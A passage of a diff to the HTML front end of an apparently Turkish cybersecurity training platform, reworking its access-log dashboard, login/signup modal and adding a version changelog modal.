-                                    <polyline points="7 10 12 15 17 10" />
-                                    <line x1="12" y1="15" x2="12" y2="3" />
-                                </svg>
-                                <span>Logları İndir (JSON)</span>
-                            </button>
-                            <button class="btn-glow-blue" id="btn-refresh-logs" data-i18n="btn_refresh_logs">
-                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                    stroke-width="2">
-                                    <polyline points="23 4 23 10 17 10" />
-                                    <polyline points="1 20 1 14 7 14" />
-                                    <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" />
-                                </svg>
-                                <span>Logları Yenile</span>
-                            </button>
+                            <button class="btn-secondary" id="btn-refresh-logs" data-i18n="btn_refresh_logs">Logları Yenile</button>
+                            <button class="btn-glow-blue" id="btn-export-logs" data-i18n="btn_export_logs">Logları İndir (JSON)</button>
                         </div>
                     </div>
 
-                    <!-- Admin DEFCON & Broadcast Controller (Exclusive for burak_wyxz) -->
-                    <div class="panel-card"
-                        style="margin-bottom: 20px; padding: 18px 22px; border: 1px solid rgba(0, 229, 255, 0.35); background: linear-gradient(135deg, rgba(6, 12, 28, 0.98), rgba(12, 24, 52, 0.95));"
-                        data-reveal>
-                        <div
-                            style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 14px; margin-bottom: 14px;">
-                            <div>
-                                <div
-                                    style="font-family: var(--font-mono); font-size: 11.5px; color: #00e5ff; font-weight: 800; letter-spacing: 1.5px;">
-                                    👑 BAŞ YÖNETİCİ KONSOLU // burak_wyxz</div>
-                                <div style="font-size: 13px; color: #cbd5e1; margin-top: 3px;">Platform Savunma Alarmı
-                                    (DEFCON Seviyesi) &amp; Acil Durum Yönetimi</div>
-                            </div>
-                            <div style="display: flex; align-items: center; gap: 8px;">
-                                <button type="button" class="btn-defcon btn-defcon-1" id="btn-defcon-1"
-                                    title="Kırmızı Alarm - Saldırı ve Sızma">🚨 DEFCON 1</button>
-                                <button type="button" class="btn-defcon btn-defcon-3" id="btn-defcon-3"
-                                    title="Yüksek Güvenlik Modu">⚠️ DEFCON 3</button>
-                                <button type="button" class="btn-defcon btn-defcon-5 active" id="btn-defcon-5"
-                                    title="Normal Savunma Durumu">🛡️ DEFCON 5</button>
-                            </div>
-                        </div>
-                        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
-                            <input type="text" id="admin-broadcast-input"
-                                placeholder="Tüm platforma canlı acil durum neon duyurusu yayınla (örn: Siber tatbikat aktif)..."
-                                style="flex: 1; min-width: 250px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,229,255,0.25); border-radius: 4px; padding: 8px 12px; color: #fff; font-family: inherit; font-size: 12px; outline: none;" />
-                            <button type="button" class="btn-glow-blue btn-sm" id="btn-publish-broadcast">📢 Duyuru
-                                Yayınla</button>
-                            <button type="button" class="btn-secondary btn-sm" id="btn-clear-broadcast">Kaldır</button>
-                        </div>
-                    </div>
-
-                    <!-- Log Metrics -->
                     <div class="kpi-grid" data-reveal-stagger style="margin-bottom: 24px;">
-                        <div class="kpi-card">
-                            <div class="kpi-data">
-                                <span class="kpi-title" data-i18n="logs_stat_total">TOPLAM ERİŞİM İSTEĞİ</span>
-                                <span class="kpi-value text-cyan" id="log-stat-total">0</span>
-                                <span class="kpi-hint text-green">&bull; Gerçek Zamanlı Telemetri</span>
-                            </div>
-                        </div>
-                        <div class="kpi-card">
-                            <div class="kpi-data">
-                                <span class="kpi-title" data-i18n="logs_stat_ips">BENZERSİZ IP ADRESİ</span>
-                                <span class="kpi-value text-green" id="log-stat-ips">0</span>
-                                <span class="kpi-hint text-green">&bull; IPv4 / IPv6 Yakalandı</span>
-                            </div>
-                        </div>
-                        <div class="kpi-card">
-                            <div class="kpi-data">
-                                <span class="kpi-title" data-i18n="logs_stat_admins">YÖNETİCİ ERİŞİMLERİ</span>
-                                <span class="kpi-value text-purple" id="log-stat-admins">0</span>
-                                <span class="kpi-hint text-purple">&bull; lostfromlight / admin</span>
-                            </div>
-                        </div>
-                        <div class="kpi-card">
-                            <div class="kpi-data">
-                                <span class="kpi-title" data-i18n="logs_stat_status">SİSTEM LOG DURUMU</span>
-                                <span class="kpi-value text-blue" id="log-stat-status">100% CAPTURING</span>
-                                <span class="kpi-hint text-green">&bull; EDR &bull; HSTS &bull; RemoteIp</span>
-                            </div>
-                        </div>
+                        <div class="kpi-card"><div class="kpi-data"><span class="kpi-title" data-i18n="logs_stat_total">TOPLAM ERİŞİM İSTEĞİ</span><span class="kpi-value text-cyan" id="log-stat-total">0</span><span class="kpi-hint text-green">• 100% SQLite'a Kaydedildi</span></div></div>
+                        <div class="kpi-card"><div class="kpi-data"><span class="kpi-title" data-i18n="logs_stat_ips">BENZERSİZ IP ADRESİ</span><span class="kpi-value text-green" id="log-stat-ips">0</span><span class="kpi-hint text-green">• Aktif Ziyaretçi</span></div></div>
+                        <div class="kpi-card"><div class="kpi-data"><span class="kpi-title" data-i18n="logs_stat_admins">YÖNETİCİ ERİŞİMLERİ</span><span class="kpi-value text-purple" id="log-stat-admins">0</span><span class="kpi-hint text-green">• Yetkilendirilmiş Operatör</span></div></div>
+                        <div class="kpi-card"><div class="kpi-data"><span class="kpi-title" data-i18n="logs_stat_status">SİSTEM LOG DURUMU</span><span class="kpi-value text-blue" id="log-stat-status">AKTİF</span><span class="kpi-hint text-green">• Real-Time Sniffing</span></div></div>
                     </div>
 
-                    <!-- Search Filter Row -->
-                    <div class="filter-bar" data-reveal>
-                        <div class="search-input-wrap">
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                stroke-width="2">
-                                <circle cx="11" cy="11" r="8" />
-                                <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                            </svg>
-                            <input type="text" id="logs-search-input"
-                                placeholder="IP, İşletim Sistemi, Tarayıcı veya Kullanıcı Ara..." />
-                        </div>
-                    </div>
-
-                    <!-- Logs Table -->
                     <div class="panel-card" data-reveal>
-                        <div class="panel-header">
-                            <div class="panel-title">
-                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)"
-                                    stroke-width="2">
-                                    <polyline points="4 17 10 11 4 5" />
-                                    <line x1="12" y1="19" x2="20" y2="19" />
-                                </svg>
-                                <span>İstemci Erişim &amp; Telemetri Kayıtları (/api/blog/access-logs)</span>
+                        <div class="panel-header" style="flex-wrap: wrap; gap: 12px;">
+                            <div class="search-input-wrap" style="flex: 1; min-width: 260px;">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                                <input type="text" id="logs-search-input" class="logs-search-input" placeholder="IP, İşletim Sistemi, Tarayıcı veya Kullanıcı Ara..." />
                             </div>
-                            <span class="badge-pulsing-green" id="log-live-status">CANLI KAYIT AKIŞI</span>
+                            <span class="badge-soft-green">CANLI TELEMETRİ</span>
                         </div>
-                        <div class="panel-body" style="padding: 0; overflow-x: auto;">
-                            <table class="compliance-table" id="access-logs-table">
+                        <div class="table-container">
+                            <table class="data-table">
                                 <thead>
                                     <tr>
                                         <th data-i18n="logs_col_time">Zaman</th>
@@ -1481,126 +1482,104 @@
                                         <th data-i18n="logs_col_status">Durum</th>
                                     </tr>
                                 </thead>
-                                <tbody id="access-logs-tbody">
-                                    <tr>
-                                        <td colspan="7" class="text-center text-muted" style="padding: 24px;">Loglar
-                                            yükleniyor...</td>
-                                    </tr>
-                                </tbody>
+                                <tbody id="access-logs-tbody"><tr><td colspan="7" class="text-center text-muted" style="padding: 24px;">Ziyaretçi logları taranıyor...</td></tr></tbody>
                             </table>
                         </div>
                     </div>
                 </section>
+
             </main>
         </div>
     </div>
 
-    <!-- COMMAND PALETTE MODAL (Ctrl + K) -->
-    <div id="command-palette-modal" class="palette-backdrop hidden">
-        <div class="palette-dialog">
-            <div class="palette-search-row">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2">
-                    <circle cx="11" cy="11" r="8" />
-                    <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                </svg>
-                <input type="text" id="palette-search-input"
-                    placeholder="Komut yazın veya sayfaya geçin... (örn: 'terminal', 'academy', 'audit', 'jwt')"
-                    autocomplete="off" />
-                <kbd id="btn-close-palette">ESC</kbd>
+    <!-- Modals -->
+    <!-- AUTHENTICATION MODAL -->
+    <div class="modal-overlay hidden" id="auth-modal">
+        <div class="auth-modal-card">
+            <button class="modal-close-btn" id="btn-close-auth-modal">&times;</button>
+            <div class="auth-modal-header">
+                <div class="auth-icon-badge"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+                <h3 class="auth-main-title" id="auth-main-title">Operatör Girişi</h3>
+                <p class="auth-main-subtitle" id="auth-main-subtitle">HMAC-SHA256 Token Tahsisi &amp; Session Storage Katmanı</p>
             </div>
-            <div class="palette-results-list" id="palette-results"></div>
-        </div>
-    </div>
-
-    <!-- CLEAN CORPORATE AUTHENTICATION MODAL -->
-    <div id="auth-modal" class="palette-backdrop hidden">
-        <div class="auth-clean-card">
-            <button class="modal-close-icon" id="btn-close-auth-modal">&times;</button>
-
-            <div class="auth-dialog-header" style="text-align: center; margin-bottom: 20px;">
-                <div class="brand-shield" style="margin: 0 auto 12px; width: 44px; height: 44px;">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                        stroke-width="2.2">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                        <path d="M9 12l2 2 4-4" />
-                    </svg>
-                </div>
-                <h3 class="auth-title" id="auth-main-title" data-i18n="auth_title_signin">Operatör Kimlik Doğrulama</h3>
-                <p class="auth-subtitle" id="auth-main-subtitle" data-i18n="auth_sub_signin">Güvenli Erişim Ağ Geçidi
-                    &bull; JWT Bearer Token Yönetimi</p>
-            </div>
-
-            <div class="auth-pill-switcher">
-                <button class="auth-switch-btn active" id="modal-tab-signin">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
-                        <polyline points="10 17 15 12 10 7" />
-                        <line x1="15" y1="12" x2="3" y2="12" />
-                    </svg>
-                    <span data-i18n="auth_tab_signin">Giriş Yap</span>
-                </button>
-                <button class="auth-switch-btn" id="modal-tab-signup">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <circle cx="12" cy="12" r="10" />
-                        <line x1="12" y1="8" x2="12" y2="16" />
-                        <line x1="8" y1="12" x2="16" y2="12" />
-                    </svg>
-                    <span data-i18n="auth_tab_signup">Kayıt Ol</span>
-                </button>
-            </div>
-
-            <div id="auth-modal-alert"></div>
-
-            <form id="auth-modal-form" class="enterprise-form">
-                <div class="form-row">
-                    <label class="form-label" data-i18n="form_username_label">Operatör Adı / Callsign</label>
-                    <input type="text" id="auth-input-username" class="form-input-styled" required autocomplete="off"
-                        placeholder="Kullanıcı Adı / Callsign (örn: lostfromlight)" value="" />
-                </div>
-
-                <div class="form-row">
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <label class="form-label" data-i18n="form_password_label">Şifre / Güvenlik Anahtarı</label>
-                        <span class="entropy-label" id="entropy-text">Hazır</span>
-                    </div>
-                    <input type="password" id="auth-input-password" class="form-input-styled" required
-                        placeholder="••••••••" value="" />
-
-                    <div class="entropy-meter-bar">
-                        <div class="entropy-fill" id="entropy-bar-fill"></div>
-                    </div>
-                </div>
-
-                <!-- Registration Password Confirmation Row -->
-                <div class="form-row hidden" id="auth-row-confirm">
-                    <label class="form-label" data-i18n="form_confirm_password_label">Şifre Doğrulama (Tekrar)</label>
-                    <input type="password" id="auth-input-confirm" class="form-input-styled" placeholder="••••••••"
-                        value="" />
-                </div>
-
-                <button type="submit" id="auth-btn-execute" class="btn-glow-blue btn-full"
-                    style="margin-top: 10px; padding: 12px;" data-i18n="btn_auth_execute">
-                    Giriş Yap &amp; Session Storage'a Kaydet &rarr;
-                </button>
+            <div class="auth-tabs"><button class="auth-tab active" id="modal-tab-signin" data-i18n="auth_tab_signin">Giriş Yap</button><button class="auth-tab" id="modal-tab-signup" data-i18n="auth_tab_signup">Kayıt Ol</button></div>
+            <form id="auth-modal-form" class="auth-form-body">
+                <div id="auth-modal-alert"></div>
+                <div class="form-group"><label class="form-label" data-i18n="form_username_label">Kullanıcı Adı / Callsign</label><input type="text" id="auth-input-username" class="form-input" required autocomplete="off" placeholder="Kullanıcı Adı (örn: lostfromlight)" /></div>
+                <div class="form-group"><label class="form-label" data-i18n="form_password_label">Şifre / Güvenlik Anahtarı</label><input type="password" id="auth-input-password" class="form-input" required placeholder="Şifrenizi girin..." /></div>
+                <div class="form-group hidden" id="auth-row-confirm"><label class="form-label" data-i18n="form_confirm_password_label">Şifreyi Onayla</label><input type="password" id="auth-input-confirm" class="form-input" placeholder="Şifrenizi tekrar girin..." /></div>
+                <div class="entropy-meter-box" style="margin-bottom: 16px;"><div class="entropy-bar-track"><div class="entropy-bar-fill" id="entropy-bar-fill" style="width: 35%; background: var(--cyan);"></div></div><span class="entropy-text" id="entropy-text">Standart Entropi</span></div>
+                <button type="submit" class="btn-glow-blue btn-block" id="auth-btn-execute" data-i18n="btn_auth_execute">Giriş Yap &amp; Session Storage'a Kaydet &rarr;</button>
             </form>
+        </div>
+    </div>
 
-            <div class="storage-info-badge" style="margin-top: 16px;">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-                </svg>
-                <span>Yetkilendirme ile birlikte JWT token doğrudan <strong>sessionStorage['cyber_token']</strong> içine
-                    yazılır.</span>
+    <!-- SYSTEM CHANGELOG & UPDATE LOG MODAL -->
+    <div id="changelog-modal" class="palette-backdrop hidden">
+        <div class="changelog-modal-card">
+            <button class="modal-close-icon" id="btn-close-changelog-modal">&times;</button>
+            
+            <div class="changelog-header">
+                <div class="changelog-title-row">
+                    <span class="changelog-title-icon">🚀</span>
+                    <h3 class="changelog-title" data-i18n="changelog_title">SİSTEM GÜNCELLEME GÜNLÜĞÜ</h3>
+                    <span class="changelog-current-badge">v4.1 CANLI</span>
+                </div>
+                <p class="changelog-subtitle" data-i18n="changelog_subtitle">
+                    LFL Platform mimarisine eklenen tüm yeni modüller, güvenlik katmanları, oda genişletmeleri ve komut motoru kayıtları.
+                </p>
+                
+                <div class="changelog-stats-row">
+                    <div class="changelog-stat-box">
+                        <div class="changelog-stat-val">v4.1</div>
+                        <div class="changelog-stat-lbl" data-i18n="cl_stat_version">Aktif Sürüm</div>
+                    </div>
+                    <div class="changelog-stat-box">
+                        <div class="changelog-stat-val">69 Oda</div>
+                        <div class="changelog-stat-lbl" data-i18n="cl_stat_rooms">Toplam Görev</div>
+                    </div>
+                    <div class="changelog-stat-box">
+                        <div class="changelog-stat-val">143+ Kod</div>
+                        <div class="changelog-stat-lbl" data-i18n="cl_stat_cli">Terminal Motoru</div>
+                    </div>
+                    <div class="changelog-stat-box">
+                        <div class="changelog-stat-val">TR / EN</div>
+                        <div class="changelog-stat-lbl" data-i18n="cl_stat_lang">Dil Desteği</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="changelog-toolbar">
+                <div class="changelog-filter-pills" id="changelog-filters">
+                    <button type="button" class="changelog-filter-btn active" data-filter="all" data-i18n="cl_f_all">Tümü</button>
+                    <button type="button" class="changelog-filter-btn" data-filter="feat" data-i18n="cl_f_feat">✨ Özellikler</button>
+                    <button type="button" class="changelog-filter-btn" data-filter="sec" data-i18n="cl_f_sec">🛡️ Güvenlik</button>
+                    <button type="button" class="changelog-filter-btn" data-filter="acad" data-i18n="cl_f_acad">🎓 Akademi</button>
+                    <button type="button" class="changelog-filter-btn" data-filter="fix" data-i18n="cl_f_fix">⚡ Düzeltmeler</button>
+                </div>
+                <div class="changelog-search-wrap">
+                    <span class="changelog-search-icon">🔍</span>
+                    <input type="text" id="changelog-search-input" class="changelog-search-input" placeholder="Güncellemelerde ara..." data-i18n-placeholder="cl_search_placeholder" />
+                </div>
+            </div>
+
+            <div class="changelog-timeline-wrap" id="changelog-timeline-list">
+                <!-- Rendered dynamically by app.js -->
+            </div>
+
+            <div class="changelog-footer">
+                <span class="changelog-build-id">BUILD // 20261110-LFL-PROD-V4.1 &bull; SHA-256 VERIFIED</span>
+                <button type="button" class="btn-close-changelog" id="btn-footer-close-changelog" data-i18n="cl_btn_close">Kapat [ESC]</button>
             </div>
         </div>
     </div>
 
-    <!-- Global Floating Toast Container -->
+    <!-- Toast Notification Container -->
     <div id="toast-container" class="toast-stack"></div>
 
-    <script src="academy-data.js?v=3.9"></script>
-    <script src="rooms_data.js?v=3.9"></script>
-    <script src="app.js?v=3.9"></script>
+    <!-- Scripts -->
+    <script src="academy-data.js?v=4.2"></script>
+    <script src="rooms_data.js?v=4.2"></script>
+    <script src="app.js?v=4.2"></script>
 </body>
-
 </html>
